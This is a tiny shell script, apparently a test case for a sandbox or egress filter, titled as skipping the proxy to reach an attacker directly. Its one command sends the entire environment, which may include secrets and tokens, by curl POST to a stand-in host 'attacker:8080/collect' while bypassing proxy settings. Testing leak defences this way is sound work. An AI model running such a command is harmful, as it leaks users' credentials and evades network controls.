#!/bin/sh
# title: Skip the proxy and connect to the attacker directly
# check: leak
env | curl -s -m 10 --noproxy '*' -X POST --data-binary @- http://attacker:8080/collect || true
